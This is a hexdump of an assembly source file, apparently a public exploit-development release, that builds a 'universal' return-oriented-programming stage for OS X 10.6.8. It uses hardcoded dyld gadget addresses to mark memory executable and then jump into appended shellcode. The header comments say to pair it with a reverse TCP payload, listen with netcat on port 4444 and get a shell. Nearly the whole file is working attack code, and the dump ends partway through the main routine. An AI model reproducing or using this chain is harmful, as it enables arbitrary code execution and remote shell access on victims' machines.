00000000  3b 20 75 6e 69 76 65 72  73 61 6c 20 4f 53 58 20  |; universal OSX |
00000010  64 79 6c 64 20 52 4f 50  20 73 68 65 6c 6c 63 6f  |dyld ROP shellco|
00000020  64 65 0d 0a 3b 20 74 65  73 74 65 64 20 6f 6e 20  |de..; tested on |
00000030  4f 53 20 58 20 31 30 2e  36 2e 38 0d 0a 3b 0d 0a  |OS X 10.6.8..;..|
00000040  3b 20 69 66 20 79 6f 75  20 64 6f 6e 27 74 20 77  |; if you don't w|
00000050  61 6e 74 20 74 6f 20 63  6f 6d 70 69 6c 65 2c 20  |ant to compile, |
00000060  63 6f 70 79 20 73 74 61  67 65 30 20 63 6f 64 65  |copy stage0 code|
00000070  20 66 72 6f 6d 20 70 72  65 63 6f 6d 70 69 6c 65  | from precompile|
00000080  64 2e 74 78 74 0d 0a 3b  20 61 6e 64 20 61 70 70  |d.txt..; and app|
00000090  65 6e 64 20 79 6f 75 72  20 6e 6f 72 6d 61 6c 20  |end your normal |
000000a0  73 68 65 6c 6c 63 6f 64  65 20 74 6f 20 69 74 2e  |shellcode to it.|
000000b0  0d 0a 3b 0d 0a 3b 20 75  73 61 67 65 3a 0d 0a 3b  |..;..; usage:..;|
000000c0  20 2d 20 70 75 74 20 79  6f 75 72 20 27 6e 6f 72  | - put your 'nor|
000000d0  6d 61 6c 27 20 73 68 65  6c 6c 63 6f 64 65 20 69  |mal' shellcode i|
000000e0  6e 20 78 36 34 5f 73 68  65 6c 6c 63 6f 64 65 2e  |n x64_shellcode.|
000000f0  61 73 6d 0d 0a 3b 20 2d  20 6d 61 6b 65 0d 0a 3b  |asm..; - make..;|
00000100  20 2d 20 2e 2f 73 63 0d  0a 3b 0d 0a 3b 20 69 66  | - ./sc..;..; if|
00000110  20 79 6f 75 20 77 61 6e  74 20 74 6f 20 74 65 73  | you want to tes|
00000120  74 3a 0d 0a 3b 20 2d 20  75 6e 63 6f 6d 6d 65 6e  |t:..; - uncommen|
00000130  74 20 6c 65 61 20 72 73  70 2c 20 5b 72 65 6c 20  |t lea rsp, [rel |
00000140  72 6f 70 5f 73 74 61 67  65 30 5d 20 2f 20 72 65  |rop_stage0] / re|
00000150  74 0d 0a 3b 20 2d 20 6d  61 6b 65 0d 0a 3b 20 2d  |t..; - make..; -|
00000160  20 6e 63 20 2d 6c 20 34  34 34 34 0d 0a 3b 20 2d  | nc -l 4444..; -|
00000170  20 2e 2f 73 63 0d 0a 3b  20 2d 20 79 6f 75 20 73  | ./sc..; - you s|
00000180  68 6f 75 6c 64 20 67 65  74 20 61 20 73 68 65 6c  |hould get a shel|
00000190  6c 20 6f 76 65 72 20 6e  63 0d 0a 3b 0d 0a 3b 20  |l over nc..;..; |
000001a0  73 65 65 20 6d 79 20 62  6c 6f 67 2c 20 69 66 20  |see my blog, if |
000001b0  79 6f 75 20 77 61 6e 74  20 74 6f 20 6b 6e 6f 77  |you want to know|
000001c0  20 68 6f 77 20 74 68 69  73 20 77 6f 72 6b 73 3a  | how this works:|
000001d0  0d 0a 3b 20 68 74 74 70  3a 2f 2f 67 64 74 72 2e  |..; http://gdtr.|
000001e0  77 6f 72 64 70 72 65 73  73 2e 63 6f 6d 0d 0a 3b  |wordpress.com..;|
000001f0  0d 0a 3b 20 67 72 65 65  74 73 20 74 6f 20 4a 61  |..; greets to Ja|
00000200  63 6f 62 20 48 61 6d 6d  61 63 6b 2c 20 66 6f 72  |cob Hammack, for|
00000210  20 68 69 73 20 72 65 76  65 72 73 65 20 74 63 70  | his reverse tcp|
00000220  20 73 68 65 6c 6c 63 6f  64 65 20 28 68 61 6d 6d  | shellcode (hamm|
00000230  61 63 6b 6a 2e 63 6f 6d  29 2e 0d 0a 3b 0d 0a 3b  |ackj.com)...;..;|
00000240  20 70 61 5f 6b 74 0d 0a  3b 20 74 77 69 74 74 65  | pa_kt..; twitte|
00000250  72 2e 63 6f 6d 2f 70 61  5f 6b 74 0d 0a 20 0d 0a  |r.com/pa_kt.. ..|
00000260  65 78 74 65 72 6e 20 5f  70 72 69 6e 74 66 0d 0a  |extern _printf..|
00000270  20 0d 0a 67 6c 6f 62 61  6c 20 5f 6d 61 69 6e 0d  | ..global _main.|
00000280  0a 20 0d 0a 3b 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |. ..;-----------|
00000290  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000002b0  2d 2d 2d 2d 2d 2d 2d 0d  0a 3b 2d 20 44 41 54 41  |-------..;- DATA|
000002c0  0d 0a 3b 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |..;-------------|
000002d0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000002f0  2d 2d 2d 2d 2d 0d 0a 73  65 63 74 69 6f 6e 20 2e  |-----..section .|
00000300  64 61 74 61 0d 0a 20 20  20 20 20 0d 0a 72 77 5f  |data..     ..rw_|
00000310  61 72 65 61 20 20 20 20  20 65 71 75 20 30 78 30  |area     equ 0x0|
00000320  30 30 30 37 46 46 46 35  46 43 35 30 30 30 30 0d  |0007FFF5FC50000.|
00000330  0a 72 77 78 5f 61 72 65  61 20 20 20 20 65 71 75  |.rwx_area    equ|
00000340  20 72 77 5f 61 72 65 61  2b 30 78 31 30 30 30 0d  | rw_area+0x1000.|
00000350  0a 76 6d 5f 70 72 6f 74  20 20 20 20 20 65 71 75  |.vm_prot     equ|
00000360  20 30 78 30 30 30 30 37  46 46 46 35 46 43 30 44  | 0x00007FFF5FC0D|
00000370  33 35 36 0d 0a 66 61 6b  65 5f 73 74 61 63 6b 20  |356..fake_stack |
00000380  20 65 71 75 20 72 77 5f  61 72 65 61 2b 30 78 32  | equ rw_area+0x2|
00000390  30 30 30 0d 0a 66 61 6b  65 5f 66 72 61 6d 65 20  |000..fake_frame |
000003a0  20 65 71 75 20 66 61 6b  65 5f 73 74 61 63 6b 2b  | equ fake_stack+|
000003b0  30 78 31 30 30 0d 0a 72  31 32 5f 7a 65 72 6f 20  |0x100..r12_zero |
000003c0  20 20 20 65 71 75 20 72  77 5f 61 72 65 61 2d 30  |   equ rw_area-0|
000003d0  78 31 30 30 30 0d 0a 20  0d 0a 72 61 78 5f 6f 66  |x1000.. ..rax_of|
000003e0  66 20 20 20 20 20 65 71  75 20 72 77 5f 61 72 65  |f     equ rw_are|
000003f0  61 2d 38 0d 0a 72 62 78  5f 6f 66 66 20 20 20 20  |a-8..rbx_off    |
00000400  20 65 71 75 20 72 77 5f  61 72 65 61 2b 38 2d 38  | equ rw_area+8-8|
00000410  0d 0a 72 63 78 5f 6f 66  66 20 20 20 20 20 65 71  |..rcx_off     eq|
00000420  75 20 72 77 5f 61 72 65  61 2b 30 78 31 30 2d 38  |u rw_area+0x10-8|
00000430  0d 0a 72 64 78 5f 6f 66  66 20 20 20 20 20 65 71  |..rdx_off     eq|
00000440  75 20 72 77 5f 61 72 65  61 2b 30 78 31 38 2d 38  |u rw_area+0x18-8|
00000450  0d 0a 72 73 69 5f 6f 66  66 20 20 20 20 20 65 71  |..rsi_off     eq|
00000460  75 20 72 77 5f 61 72 65  61 2b 30 78 32 38 2d 38  |u rw_area+0x28-8|
00000470  0d 0a 72 62 70 5f 6f 66  66 20 20 20 20 20 65 71  |..rbp_off     eq|
00000480  75 20 72 77 5f 61 72 65  61 2b 30 78 33 30 2d 38  |u rw_area+0x30-8|
00000490  0d 0a 72 73 70 5f 6f 66  66 20 20 20 20 20 65 71  |..rsp_off     eq|
000004a0  75 20 72 77 5f 61 72 65  61 2b 30 78 33 38 2d 38  |u rw_area+0x38-8|
000004b0  0d 0a 72 38 5f 6f 66 66  20 20 20 20 20 20 65 71  |..r8_off      eq|
000004c0  75 20 72 77 5f 61 72 65  61 2b 30 78 34 30 2d 38  |u rw_area+0x40-8|
000004d0  0d 0a 72 31 32 5f 6f 66  66 20 20 20 20 20 65 71  |..r12_off     eq|
000004e0  75 20 72 77 5f 61 72 65  61 2b 30 78 36 30 2d 38  |u rw_area+0x60-8|
000004f0  0d 0a 20 0d 0a 70 6f 70  5f 72 64 69 20 20 20 20  |.. ..pop_rdi    |
00000500  20 65 71 75 20 30 78 30  30 30 30 37 46 46 46 35  | equ 0x00007FFF5|
00000510  46 43 32 34 43 44 43 0d  0a 70 6f 70 5f 72 62 78  |FC24CDC..pop_rbx|
00000520  20 20 20 20 20 65 71 75  20 30 78 30 30 30 30 37  |     equ 0x00007|
00000530  46 46 46 35 46 43 32 33  33 37 33 0d 0a 73 74 6f  |FFF5FC23373..sto|
00000540  72 65 5f 72 65 67 20 20  20 65 71 75 20 30 78 30  |re_reg   equ 0x0|
00000550  30 30 30 37 46 46 46 35  46 43 32 34 43 45 31 0d  |0007FFF5FC24CE1.|
00000560  0a 73 65 74 5f 72 65 67  73 20 20 20 20 65 71 75  |.set_regs    equ|
00000570  20 30 78 30 30 30 30 37  46 46 46 35 46 43 32 34  | 0x00007FFF5FC24|
00000580  43 41 31 0d 0a 20 0d 0a  63 5f 72 77 78 20 20 20  |CA1.. ..c_rwx   |
00000590  20 20 20 20 65 71 75 20  37 0d 0a 63 5f 73 69 7a  |    equ 7..c_siz|
000005a0  65 20 20 20 20 20 20 65  71 75 20 30 78 31 30 30  |e      equ 0x100|
000005b0  30 0d 0a 63 5f 61 64 64  72 20 20 20 20 20 20 65  |0..c_addr      e|
000005c0  71 75 20 72 77 78 5f 61  72 65 61 0d 0a 63 5f 73  |qu rwx_area..c_s|
000005d0  65 74 5f 6d 61 78 20 20  20 65 71 75 20 30 0d 0a  |et_max   equ 0..|
000005e0  20 0d 0a 64 62 67 5f 72  65 74 20 20 20 20 20 65  | ..dbg_ret     e|
000005f0  71 75 20 30 78 30 30 30  30 37 46 46 46 35 46 43  |qu 0x00007FFF5FC|
00000600  32 34 43 34 42 0d 0a 20  0d 0a 3b 20 63 6f 70 79  |24C4B.. ..; copy|
00000610  20 73 68 65 6c 6c 63 6f  64 65 20 74 6f 20 52 57  | shellcode to RW|
00000620  58 20 61 72 65 61 0d 0a  3b 20 73 69 7a 65 20 3d  |X area..; size =|
00000630  20 30 78 31 30 30 30 0d  0a 73 74 75 62 3a 0d 0a  | 0x1000..stub:..|
00000640  20 20 20 20 6c 65 61 20  72 73 69 2c 20 5b 72 31  |    lea rsi, [r1|
00000650  35 2b 73 61 76 65 64 5f  72 73 70 5f 6f 66 66 2b  |5+saved_rsp_off+|
00000660  63 6f 70 79 5f 73 74 75  62 5f 73 69 7a 65 2b 72  |copy_stub_size+r|
00000670  6f 70 5f 70 6f 73 74 5f  73 69 7a 65 5d 0d 0a 20  |op_post_size].. |
00000680  20 20 20 78 6f 72 20 72  63 78 2c 20 72 63 78 0d  |   xor rcx, rcx.|
00000690  0a 20 20 20 20 69 6e 63  20 72 63 78 0d 0a 20 20  |.    inc rcx..  |
000006a0  20 20 73 68 6c 20 72 63  78 2c 20 31 32 20 3b 72  |  shl rcx, 12 ;r|
000006b0  63 78 20 3d 20 30 78 31  30 30 30 0d 0a 20 20 20  |cx = 0x1000..   |
000006c0  20 6c 65 61 20 72 64 69  2c 20 5b 72 65 6c 20 6e  | lea rdi, [rel n|
000006d0  6f 72 6d 61 6c 5f 73 68  65 6c 6c 63 6f 64 65 5d  |ormal_shellcode]|
000006e0  0d 0a 20 20 20 20 72 65  70 20 6d 6f 76 73 62 0d  |..    rep movsb.|
000006f0  0a 20 20 20 20 3b 69 6e  74 20 33 0d 0a 6e 6f 72  |.    ;int 3..nor|
00000700  6d 61 6c 5f 73 68 65 6c  6c 63 6f 64 65 3a 0d 0a  |mal_shellcode:..|
00000710  20 0d 0a 73 74 75 62 5f  73 69 7a 65 20 20 20 65  | ..stub_size   e|
00000720  71 75 20 24 2d 73 74 75  62 0d 0a 20 0d 0a 20 20  |qu $-stub.. ..  |
00000730  20 20 20 20 20 20 20 20  20 20 3b 20 6f 72 64 65  |          ; orde|
00000740  72 20 69 73 20 69 6d 70  6f 72 74 61 6e 74 0d 0a  |r is important..|
00000750  72 6f 70 5f 70 72 65 20  20 20 20 20 64 71 20 20  |rop_pre     dq  |
00000760  70 6f 70 5f 72 64 69 2c  20 72 63 78 5f 6f 66 66  |pop_rdi, rcx_off|
00000770  2c 20 70 6f 70 5f 72 62  78 2c 20 63 5f 73 65 74  |, pop_rbx, c_set|
00000780  5f 6d 61 78 2c 20 73 74  6f 72 65 5f 72 65 67 2c  |_max, store_reg,|
00000790  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 64 71  |..            dq|
000007a0  20 20 70 6f 70 5f 72 64  69 2c 20 72 64 78 5f 6f  |  pop_rdi, rdx_o|
000007b0  66 66 2c 20 70 6f 70 5f  72 62 78 2c 20 63 5f 73  |ff, pop_rbx, c_s|
000007c0  69 7a 65 2c 20 73 74 6f  72 65 5f 72 65 67 2c 0d  |ize, store_reg,.|
000007d0  0a 20 20 20 20 20 20 20  20 20 20 20 20 64 71 20  |.            dq |
000007e0  20 70 6f 70 5f 72 64 69  2c 20 72 73 69 5f 6f 66  | pop_rdi, rsi_of|
000007f0  66 2c 20 70 6f 70 5f 72  62 78 2c 20 63 5f 61 64  |f, pop_rbx, c_ad|
00000800  64 72 2c 20 73 74 6f 72  65 5f 72 65 67 2c 0d 0a  |dr, store_reg,..|
00000810  20 20 20 20 20 20 20 20  20 20 20 20 64 71 20 20  |            dq  |
00000820  70 6f 70 5f 72 64 69 2c  20 72 62 70 5f 6f 66 66  |pop_rdi, rbp_off|
00000830  2c 20 70 6f 70 5f 72 62  78 2c 20 66 61 6b 65 5f  |, pop_rbx, fake_|
00000840  66 72 61 6d 65 2c 20 73  74 6f 72 65 5f 72 65 67  |frame, store_reg|
00000850  2c 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 64  |,..            d|
00000860  71 20 20 70 6f 70 5f 72  64 69 2c 20 72 73 70 5f  |q  pop_rdi, rsp_|
00000870  6f 66 66 2c 20 70 6f 70  5f 72 62 78 2c 20 66 61  |off, pop_rbx, fa|
00000880  6b 65 5f 73 74 61 63 6b  2c 20 73 74 6f 72 65 5f  |ke_stack, store_|
00000890  72 65 67 2c 0d 0a 20 20  20 20 20 20 20 20 20 20  |reg,..          |
000008a0  20 20 64 71 20 20 70 6f  70 5f 72 64 69 2c 20 72  |  dq  pop_rdi, r|
000008b0  38 5f 6f 66 66 2c 20 70  6f 70 5f 72 62 78 2c 20  |8_off, pop_rbx, |
000008c0  63 5f 72 77 78 2c 20 73  74 6f 72 65 5f 72 65 67  |c_rwx, store_reg|
000008d0  2c 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 64  |,..            d|
000008e0  71 20 20 70 6f 70 5f 72  64 69 2c 20 72 31 32 5f  |q  pop_rdi, r12_|
000008f0  6f 66 66 2c 20 70 6f 70  5f 72 62 78 2c 20 72 31  |off, pop_rbx, r1|
00000900  32 5f 7a 65 72 6f 2c 20  73 74 6f 72 65 5f 72 65  |2_zero, store_re|
00000910  67 2c 0d 0a 20 0d 0a 20  20 20 20 20 20 20 20 20  |g,.. ..         |
00000920  20 20 20 3b 20 73 65 74  20 66 61 6b 65 20 73 74  |   ; set fake st|
00000930  61 63 6b 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |ack..           |
00000940  20 64 71 20 20 70 6f 70  5f 72 64 69 2c 20 66 61  | dq  pop_rdi, fa|
00000950  6b 65 5f 73 74 61 63 6b  2b 38 2d 38 2c 20 70 6f  |ke_stack+8-8, po|
00000960  70 5f 72 62 78 2c 20 76  6d 5f 70 72 6f 74 2c 20  |p_rbx, vm_prot, |
00000970  73 74 6f 72 65 5f 72 65  67 2c 0d 0a 20 20 20 20  |store_reg,..    |
00000980  20 20 20 20 20 20 20 20  20 0d 0a 20 20 20 20 20  |         ..     |
00000990  20 20 20 20 20 20 20 3b  20 73 65 74 20 66 61 6b  |       ; set fak|
000009a0  65 20 66 72 61 6d 65 20  28 72 65 74 75 72 6e 20  |e frame (return |
000009b0  61 64 64 72 65 73 73 20  2d 3e 20 72 77 78 20 70  |address -> rwx p|
000009c0  61 67 65 29 0d 0a 20 20  20 20 20 20 20 20 20 20  |age)..          |
000009d0  20 20 64 71 20 20 70 6f  70 5f 72 64 69 2c 20 66  |  dq  pop_rdi, f|
000009e0  61 6b 65 5f 66 72 61 6d  65 2d 38 2d 30 78 33 38  |ake_frame-8-0x38|
000009f0  2c 20 73 74 6f 72 65 5f  72 65 67 2c 0d 0a 73 61  |, store_reg,..sa|
00000a00  76 65 64 5f 72 73 70 3a  0d 0a 20 20 20 20 20 20  |ved_rsp:..      |
00000a10  20 20 20 20 20 20 64 71  20 20 70 6f 70 5f 72 64  |      dq  pop_rd|
00000a20  69 2c 20 66 61 6b 65 5f  66 72 61 6d 65 2b 38 2d  |i, fake_frame+8-|
00000a30  38 2c 20 70 6f 70 5f 72  62 78 2c 20 72 77 78 5f  |8, pop_rbx, rwx_|
00000a40  61 72 65 61 2c 20 73 74  6f 72 65 5f 72 65 67 2c  |area, store_reg,|
00000a50  0d 0a 20 0d 0a 72 6f 70  5f 70 72 65 5f 73 69 7a  |.. ..rop_pre_siz|
00000a60  65 20 20 20 20 65 71 75  20 24 2d 72 6f 70 5f 70  |e    equ $-rop_p|
00000a70  72 65 20 20 20 20 20 20  20 20 20 20 20 0d 0a 73  |re           ..s|
00000a80  61 76 65 64 5f 72 73 70  5f 6f 66 66 20 20 20 65  |aved_rsp_off   e|
00000a90  71 75 20 24 2d 73 61 76  65 64 5f 72 73 70 2d 38  |qu $-saved_rsp-8|
00000aa0  0d 0a 20 0d 0a 72 6f 70  5f 70 6f 73 74 20 20 20  |.. ..rop_post   |
00000ab0  20 64 71 20 20 64 62 67  5f 72 65 74 0d 0a 20 20  | dq  dbg_ret..  |
00000ac0  20 20 20 20 20 20 20 20  20 20 20 0d 0a 20 20 20  |           ..   |
00000ad0  20 20 20 20 20 20 20 20  20 3b 20 73 65 74 20 61  |         ; set a|
00000ae0  6c 6c 20 72 65 67 73 20  61 6e 64 20 6a 75 6d 70  |ll regs and jump|
00000af0  20 74 6f 20 76 6d 5f 70  72 6f 74 0d 0a 20 20 20  | to vm_prot..   |
00000b00  20 20 20 20 20 20 20 20  20 64 71 20 20 70 6f 70  |         dq  pop|
00000b10  5f 72 64 69 2c 20 72 77  5f 61 72 65 61 2c 20 73  |_rdi, rw_area, s|
00000b20  65 74 5f 72 65 67 73 0d  0a 20 20 20 20 20 20 20  |et_regs..       |
00000b30  20 20 20 20 20 3b 20 6d  61 72 6b 65 72 0d 0a 20  |     ; marker.. |
00000b40  20 20 20 20 20 20 20 20  20 20 20 3b 20 64 71 20  |           ; dq |
00000b50  30 78 31 31 31 31 31 31  31 31 31 31 31 31 31 31  |0x11111111111111|
00000b60  31 31 0d 0a 20 0d 0a 72  6f 70 5f 70 6f 73 74 5f  |11.. ..rop_post_|
00000b70  73 69 7a 65 20 20 20 65  71 75 20 24 2d 72 6f 70  |size   equ $-rop|
00000b80  5f 70 6f 73 74 0d 0a 20  0d 0a 78 36 34 5f 73 68  |_post.. ..x64_sh|
00000b90  65 6c 6c 63 6f 64 65 3a  20 20 20 69 6e 63 62 69  |ellcode:   incbi|
00000ba0  6e 20 22 78 36 34 5f 73  68 65 6c 6c 63 6f 64 65  |n "x64_shellcode|
00000bb0  22 0d 0a 78 36 34 5f 73  68 65 6c 6c 63 6f 64 65  |"..x64_shellcode|
00000bc0  5f 73 69 7a 65 20 20 20  20 20 65 71 75 20 24 2d  |_size     equ $-|
00000bd0  78 36 34 5f 73 68 65 6c  6c 63 6f 64 65 0d 0a 20  |x64_shellcode.. |
00000be0  0d 0a 68 65 6c 6c 6f 20  20 20 64 62 20 22 74 65  |..hello   db "te|
00000bf0  73 74 22 2c 20 30 0d 0a  66 6d 74 20 20 20 20 20  |st", 0..fmt     |
00000c00  64 62 20 22 5c 78 25 30  32 78 22 2c 30 0d 0a 20  |db "\x%02x",0.. |
00000c10  0d 0a 73 65 63 74 69 6f  6e 20 2e 62 73 73 0d 0a  |..section .bss..|
00000c20  20 0d 0a 72 6f 70 5f 73  74 61 67 65 30 20 20 72  | ..rop_stage0  r|
00000c30  65 73 71 20 20 20 20 31  30 30 0d 0a 63 6f 70 79  |esq    100..copy|
00000c40  5f 73 74 75 62 20 20 20  72 65 73 71 20 20 20 20  |_stub   resq    |
00000c50  28 28 73 74 75 62 5f 73  69 7a 65 2b 37 29 2f 38  |((stub_size+7)/8|
00000c60  29 2a 35 0d 0a 63 6f 70  79 5f 73 74 75 62 5f 73  |)*5..copy_stub_s|
00000c70  69 7a 65 20 20 65 71 75  20 24 2d 63 6f 70 79 5f  |ize  equ $-copy_|
00000c80  73 74 75 62 0d 0a 20 0d  0a 3b 2d 2d 2d 2d 2d 2d  |stub.. ..;------|
00000c90  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000cb0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 20 20 20 0d  |------------   .|
00000cc0  0a 3b 2d 20 43 4f 44 45  0d 0a 3b 2d 2d 2d 2d 2d  |.;- CODE..;-----|
00000cd0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000cf0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 0d 0a 73  |-------------..s|
00000d00  65 63 74 69 6f 6e 20 2e  74 65 78 74 0d 0a 20 0d  |ection .text.. .|
00000d10  0a 70 72 65 70 5f 73 74  75 62 3a 0d 0a 20 0d 0a  |.prep_stub:.. ..|
00000d20  20 20 20 20 6d 6f 76 20  20 20 20 20 72 63 78 2c  |    mov     rcx,|
00000d30  20 28 73 74 75 62 5f 73  69 7a 65 2b 37 29 2f 38  | (stub_size+7)/8|
00000d40  0d 0a 20 20 20 20 6d 6f  76 20 20 20 20 20 72 73  |..    mov     rs|
00000d50  69 2c 20 73 74 75 62 0d  0a 20 20 20 20 6d 6f 76  |i, stub..    mov|
00000d60  20 20 20 20 20 72 64 69  2c 20 63 6f 70 79 5f 73  |     rdi, copy_s|
00000d70  74 75 62 0d 0a 20 20 20  20 6d 6f 76 20 20 20 20  |tub..    mov    |
00000d80  20 72 62 78 2c 20 72 77  78 5f 61 72 65 61 2d 38  | rbx, rwx_area-8|
00000d90  0d 0a 67 6f 3a 0d 0a 20  20 20 20 6d 6f 76 20 20  |..go:..    mov  |
00000da0  20 20 20 72 61 78 2c 20  70 6f 70 5f 72 64 69 0d  |   rax, pop_rdi.|
00000db0  0a 20 20 20 20 73 74 6f  73 71 0d 0a 20 20 20 20  |.    stosq..    |
00000dc0  6d 6f 76 20 20 20 20 20  72 61 78 2c 20 72 62 78  |mov     rax, rbx|
00000dd0  0d 0a 20 20 20 20 73 74  6f 73 71 0d 0a 20 20 20  |..    stosq..   |
00000de0  20 6d 6f 76 20 20 20 20  20 72 61 78 2c 20 70 6f  | mov     rax, po|
00000df0  70 5f 72 62 78 0d 0a 20  20 20 20 73 74 6f 73 71  |p_rbx..    stosq|
00000e00  0d 0a 20 20 20 20 6d 6f  76 73 71 0d 0a 20 20 20  |..    movsq..   |
00000e10  20 6d 6f 76 20 20 20 20  20 72 61 78 2c 20 73 74  | mov     rax, st|
00000e20  6f 72 65 5f 72 65 67 0d  0a 20 20 20 20 73 74 6f  |ore_reg..    sto|
00000e30  73 71 0d 0a 20 20 20 20  61 64 64 20 20 20 20 20  |sq..    add     |
00000e40  72 62 78 2c 20 38 0d 0a  20 20 20 20 6c 6f 6f 70  |rbx, 8..    loop|
00000e50  20 20 20 20 67 6f 0d 0a  20 20 20 20 72 65 74 0d  |    go..    ret.|
00000e60  0a 20 0d 0a 6d 61 6b 65  5f 73 74 61 67 65 30 3a  |. ..make_stage0:|
00000e70  0d 0a 20 20 20 20 6d 6f  76 20 20 20 20 20 72 73  |..    mov     rs|
00000e80  69 2c 20 72 6f 70 5f 70  72 65 0d 0a 20 20 20 20  |i, rop_pre..    |
00000e90  6d 6f 76 20 20 20 20 20  72 64 69 2c 20 72 6f 70  |mov     rdi, rop|
00000ea0  5f 73 74 61 67 65 30 0d  0a 20 20 20 20 6d 6f 76  |_stage0..    mov|
00000eb0  20 20 20 20 20 72 63 78  2c 20 72 6f 70 5f 70 72  |     rcx, rop_pr|
00000ec0  65 5f 73 69 7a 65 0d 0a  20 20 20 20 72 65 70 20  |e_size..    rep |
00000ed0  20 20 20 20 6d 6f 76 73  62 0d 0a 20 20 20 20 20  |    movsb..     |
00000ee0  0d 0a 20 20 20 20 6d 6f  76 20 20 20 20 20 72 73  |..    mov     rs|
00000ef0  69 2c 20 63 6f 70 79 5f  73 74 75 62 0d 0a 20 20  |i, copy_stub..  |
00000f00  20 20 6d 6f 76 20 20 20  20 20 72 63 78 2c 20 63  |  mov     rcx, c|
00000f10  6f 70 79 5f 73 74 75 62  5f 73 69 7a 65 0d 0a 20  |opy_stub_size.. |
00000f20  20 20 20 72 65 70 20 20  20 20 20 6d 6f 76 73 62  |   rep     movsb|
00000f30  0d 0a 20 0d 0a 20 20 20  20 6d 6f 76 20 20 20 20  |.. ..    mov    |
00000f40  20 72 73 69 2c 20 72 6f  70 5f 70 6f 73 74 0d 0a  | rsi, rop_post..|
00000f50  20 20 20 20 6d 6f 76 20  20 20 20 20 72 63 78 2c  |    mov     rcx,|
00000f60  20 72 6f 70 5f 70 6f 73  74 5f 73 69 7a 65 0d 0a  | rop_post_size..|
00000f70  20 20 20 20 72 65 70 20  20 20 20 20 6d 6f 76 73  |    rep     movs|
00000f80  62 0d 0a 20 20 20 20 20  0d 0a 20 20 20 20 6d 6f  |b..     ..    mo|
00000f90  76 20 20 20 20 20 72 73  69 2c 20 78 36 34 5f 73  |v     rsi, x64_s|
00000fa0  68 65 6c 6c 63 6f 64 65  0d 0a 20 20 20 20 6d 6f  |hellcode..    mo|
00000fb0  76 20 20 20 20 20 72 63  78 2c 20 78 36 34 5f 73  |v     rcx, x64_s|
00000fc0  68 65 6c 6c 63 6f 64 65  5f 73 69 7a 65 0d 0a 20  |hellcode_size.. |
00000fd0  20 20 20 72 65 70 20 20  20 20 20 6d 6f 76 73 62  |   rep     movsb|
00000fe0  0d 0a 20 0d 0a 20 20 20  20 72 65 74 0d 0a 20 0d  |.. ..    ret.. .|
00000ff0  0a 70 72 69 6e 74 5f 69  74 3a 0d 0a 20 20 20 20  |.print_it:..    |
00001000  70 75 73 68 20 20 20 20  72 62 70 0d 0a 20 20 20  |push    rbp..   |
00001010  20 6d 6f 76 20 20 20 20  20 72 62 70 2c 20 72 73  | mov     rbp, rs|
00001020  70 0d 0a 20 0d 0a 20 20  20 20 6d 6f 76 20 20 20  |p.. ..    mov   |
00001030  20 20 72 63 78 2c 20 72  6f 70 5f 70 72 65 5f 73  |  rcx, rop_pre_s|
00001040  69 7a 65 20 2b 20 63 6f  70 79 5f 73 74 75 62 5f  |ize + copy_stub_|
00001050  73 69 7a 65 20 2b 20 72  6f 70 5f 70 6f 73 74 5f  |size + rop_post_|
00001060  73 69 7a 65 20 2b 20 78  36 34 5f 73 68 65 6c 6c  |size + x64_shell|
00001070  63 6f 64 65 5f 73 69 7a  65 0d 0a 20 20 20 20 6c  |code_size..    l|
00001080  65 61 20 20 20 20 20 72  73 69 2c 20 5b 72 65 6c  |ea     rsi, [rel|
00001090  20 72 6f 70 5f 73 74 61  67 65 30 5d 0d 0a 20 20  | rop_stage0]..  |
000010a0  20 20 78 6f 72 20 20 20  20 20 72 61 78 2c 20 72  |  xor     rax, r|
000010b0  61 78 0d 0a 6f 6e 65 5f  63 68 61 72 3a 0d 0a 20  |ax..one_char:.. |
000010c0  20 20 20 6c 6f 64 73 62  0d 0a 20 20 20 20 70 75  |   lodsb..    pu|
000010d0  73 68 20 20 20 20 72 73  69 0d 0a 20 20 20 20 70  |sh    rsi..    p|
000010e0  75 73 68 20 20 20 20 72  63 78 0d 0a 20 20 20 20  |ush    rcx..    |
000010f0  6d 6f 76 20 20 20 20 20  72 73 69 2c 20 72 61 78  |mov     rsi, rax|
00001100  0d 0a 20 20 20 20 6d 6f  76 20 20 20 20 20 72 64  |..    mov     rd|
00001110  69 2c 20 71 77 6f 72 64  20 66 6d 74 0d 0a 20 20  |i, qword fmt..  |
00001120  20 20 78 6f 72 20 20 20  20 20 72 61 78 2c 20 72  |  xor     rax, r|
00001130  61 78 0d 0a 20 20 20 20  63 61 6c 6c 20 20 20 20  |ax..    call    |
00001140  5f 70 72 69 6e 74 66 0d  0a 20 20 20 20 70 6f 70  |_printf..    pop|
00001150  20 20 20 20 20 72 63 78  0d 0a 20 20 20 20 70 6f  |     rcx..    po|
00001160  70 20 20 20 20 20 72 73  69 0d 0a 20 20 20 20 6c  |p     rsi..    l|
00001170  6f 6f 70 20 20 20 20 6f  6e 65 5f 63 68 61 72 0d  |oop    one_char.|
00001180  0a 20 20 20 20 20 0d 0a  20 20 20 20 6c 65 61 76  |.     ..    leav|
00001190  65 0d 0a 20 20 20 20 72  65 74 0d 0a 20 0d 0a 5f  |e..    ret.. .._|
000011a0  6d 61 69 6e 3a 0d 0a 20  20 20 20 70 75 73 68 20  |main:..    push |
000011b0  20 20 20 71 77 6f 72 64  20 72 62 70 0d 0a 20 20  |   qword rbp..  |
000011c0  20 20 6d 6f 76 20 20 20  20 20 72 62 70 2c 20 72  |  mov     rbp, r|
000011d0  73 70 0d 0a 20 0d 0a 20  20 20 20 63 61 6c 6c 20  |sp.. ..    call |
000011e0  20 20 20 70 72 65 70 5f  73 74 75 62 0d 0a 20 20  |   prep_stub..  |
